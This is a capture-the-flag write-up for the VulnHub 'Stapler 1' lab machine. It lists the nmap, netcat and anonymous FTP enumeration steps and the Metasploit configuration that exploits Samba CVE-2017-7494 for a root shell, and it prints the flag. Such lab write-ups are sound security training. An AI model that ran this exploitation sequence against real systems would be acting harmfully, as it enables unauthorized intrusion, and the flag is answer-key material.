# Stapler 1 - VulnHub Writeup

## Machine Information
- Name: Stapler 1
- Platform: VulnHub
- Level: Easy 
- Goal: Gain root access
- Network: 192.168.122.0/24

---

# 1. Network Discovery

First, I scanned the local network to identify the target machine:

```bash
nmap 192.168.122.0/24
```

The target machine was identified as:

```
192.168.122.99
```

---

# 2. Full Port Scan

Next, I performed a service and version detection scan:

```bash
nmap -A 192.168.122.99
```

## Open Ports

| Port | Service |
|------|---------|
| 21   | FTP |
| 22   | SSH |
| 53   | DNS |
| 80   | HTTP |
| 139  | SMB |
| 666  | ZIP file service |
| 3306 | MySQL |

---

# 3. Initial Attack Strategy

Since the goal is to get root access as quickly as possible, I prioritized:

- FTP (anonymous access)
- SMB (Samba version vulnerability)
- Port 666 (ZIP file)

---

# 4. Investigating Port 666

Using netcat to grab the file:

```bash
nc -nvv 192.168.122.99 666 > file.zip
```

The file extracted was an image file.

---

# 5. FTP Enumeration

Connected to FTP using anonymous credentials:

```bash
ftp 192.168.122.99
```

Login attempt:

```
Username: ftp
Password: ftp
```

Login was successful.

Listing files:

```bash
ls
```

Found a file named:

```
note
```

Viewing file content:

```bash
more note
```

The note contained internal communication hints.

Downloaded the file locally:

```bash
get note note.txt
```

---

# 6. SMB Enumeration

From the Nmap scan:

```
Samba 4.3.9-Ubuntu
```

Searching for known vulnerabilities revealed:

**CVE-2017-7494**

This vulnerability allows remote code execution (RCE).

---

# 7. Exploitation (Samba RCE)

Used Metasploit module:

```
exploit/linux/samba/is_known_pipename
```

### Configuration:

```bash
use exploit/linux/samba/is_known_pipename
set RHOSTS 192.168.122.99
set RPORT 139
set SMB_FOLDER /var/tmp
set SMB_SHARE_NAME tmp
exploit
```

The exploit successfully loaded and returned a shell.

---

# 8. Root Access

Checking privileges:

```bash
id
```

Output:

```
uid=0(root) gid=0(root)
```

Confirmed root:

```bash
whoami
```

```
root
```

---

# 9. Capturing the Flag

```bash
cat /root/flag.txt
```

Flag:

```
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

---

# Conclusion

- Anonymous FTP access was enabled.
- Samba version was vulnerable to CVE-2017-7494.
- Exploitation resulted in direct root shell access.

---

# Lessons Learned

- Always check service versions.
- Public exploits can directly lead to full compromise.
- Enumeration is the most important phase.
